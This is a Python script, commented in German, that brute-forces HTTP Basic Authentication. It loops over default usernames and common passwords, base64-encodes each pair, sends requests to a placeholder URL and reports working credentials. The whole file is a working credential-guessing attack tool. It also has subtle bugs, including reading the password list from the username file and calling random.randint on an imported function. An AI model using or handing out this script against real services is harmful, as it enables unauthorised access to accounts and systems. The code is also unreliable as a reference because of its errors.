from random import random
import requests
import json
import base64
import time
import sys

# Doku: https://docs.python-requests.org/de/latest/user/quickstart.html

user_namelist_file = "./default_users_for_services.txt"
password_namelist_file = "./most_used_passwords.txt"
url = "https://www/"
# GET - ohne Header und Body
#rGet = requests.get(url) # get request
#print(rGet.text) # gibt html zurueck
#print(rGet.status_code) # status code
#print(rGet.headers) # response headers

def encodeBase64(message,encoding="utf-8"):
    message_bytes = message.encode(encoding)
    base64_bytes = base64.b64encode(message_bytes)
    base64_message = base64_bytes.decode(encoding)
    return base64_message

def decodeBase64(message,encoding="utf-8"):
    base64_bytes = message.encode(encoding)
    message_bytes = base64.b64decode(base64_bytes)
    message = message_bytes.decode(encoding)
    return message


def send_request(username, password):
    # User:Pwd in Base64 umwandeln. User und Pwd sind mit : getrennt
    username = username.replace("\r","")
    username = username.replace("\n","")
    password = password.replace("\r","")
    password = password.replace("\n","")
    encodedMsg = encodeBase64(username + ":" +password)

    # header Daten angeben
    headers = {
        "Authorization":"Basic "+encodedMsg,
        #"Content-Type":"text/html; charset=iso-8859-1",
        #"Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"
    }
    #print(str(headers))

    # GET requests with headers
    rGet = requests.get(url, allow_redirects=False, headers=headers, timeout=5)
    
    #print(rGet.text) # gibt html zurueck
    status_code = rGet.status_code
    #print(status_code) #status code
    #print(rGet.headers) # response headers

    if str(status_code).startswith("2"):
        print(f"SUCCESS: Credentials found - {username}:{password}")
        exit()
    else:
        print(f"FAULT: {username}:{password}")

# main Funktion
if __name__ == "__main__":
    try:
        users = open(user_namelist_file).readlines()
        passwords = open(user_namelist_file).readlines()
        for usr in users:
            for pwd in passwords:
                send_request(usr, pwd)
                #time.sleep(random.randint(1,1000)/10)
                time.sleep(1)
    except:
        (type, value, traceback) = sys.exc_info()
        print("Type: ", type)
        print("Value: ", value)
        print("traceback: ", traceback)
    finally:
        users.close()
        passwords.close()






